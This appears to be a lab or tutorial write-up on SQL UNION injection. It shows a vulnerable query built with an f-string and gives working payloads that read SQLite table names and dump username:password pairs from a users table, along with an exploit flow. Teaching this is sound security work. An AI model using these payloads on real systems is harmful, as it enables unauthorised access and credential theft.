DESCRIPTION:

 * `UNION` operator:
    * **UNION** operator allow to have two or more **SELECT** statements in a query
    * **UNION** operator executes each **SELECT** statement sequentially, and combine those result sets
    * **REQUIREMENTS**: every **SELECT** statement must match the *number* of columns, the *data types* of columns, *order* of columns from the FIRST **SELECT** statement

      Example:
      ```sql
      # table(INT, TEXT, TEXT)
      SELECT id, name, description
      FROM table1
      WHERE name LIKE '%1' 
      UNION
      SELECT id2, name2, description2
      FROM table2
      WHERE name LIKE '%2' 
      ```
 * `UNION` injection:
   * **UNION** injection when server takes user input as parameter for embedded SQL statement, and the input isnt sanitized
     
     Example: `{q}` is a placeholder replaced with user input (request)
     ```asm
     sql = f"SELECT id, name, description FROM products WHERE name LIKE '%{q}%'"
     ```
   * **UNION** injection, therefore usually locates at the second clause (2nd **SELECT** statement) and so on
   * After **UNION** injection, former query result are merged with injected query
     
      Example: *UNION Injection code* and *injected SQL query*
      ```sql
      ' UNION SELECT 1, group_concat(name, ';'), 3 
        FROM sqlite_master 
        WHERE type='table' -- 
      ```
      ```sql
      SELECT id, name, description 
      FROM products 
      WHERE name LIKE '%'
      UNION 
      SELECT 1, group_concat(name, ';'), 3  # exploit 
      FROM sqlite_master 
      WHERE type='table';
      ```
      With:
     
        * `'` to closes the placeholder (**'%**) in code
     
        * `--` to comment out the rest of placeholder's closing marks (**%'**)
    
        * `'%'` = select all (names)

The flow of this exploit:
```c
(1) leak_tables(): first injection => send(q=injection): retrieve tables = tables' name
 |
<if 'user' in tables>
 |
(2) dump_users(): second injection => send(q=injection): retrieve user:password
```

Functions:
* `send(q)`:
  ```
  Send a GET request to /search with ?q=<payload>.
  Return (status_code, parsed JSON or raw text).
  ```
  
* `leak_tables()`:
  ```
  Use UNION SQL injection to extract all table names from sqlite_master.
  Original query includes 3 columns: id (INT), name (TEXT), description (TEXT)
  Leaked data is exploited and put into 2nd column (name) 
  ```
  ```sql
  ' UNION SELECT 1, group_concat(name, ';'), 3 
  FROM sqlite_master 
  WHERE type='table' -- 
  ```
  * `1` and `3` acts as dummies to meet the UNION requirements (number, data types, order), and do not exist in tables
  * `group_concat(name, ';')`: merges all table names into 1 string, separated by ";"
  * `FROM sqlite_master` selects another table (valid since UNION requirements fulfilled)

* `dump_users()`:
  ```
  dump username:password pairs from 'users' table if exists.
  data must go into 2nd column (name) 
  ```
  ```sql
  ' UNION SELECT 1, group_concat(username || ':' || password, ';'), 3 FROM users --
  ```
  * `group_concat(username || ':' || password, ';')` extract 'username', 'password' from table='users' in format: "username:password;"
 
* `main()`:
  ```python
  tables = leak_tables()
  if 'users' in tables:
      dump_users()
  ```
  Verify 'users' table, before dumping data
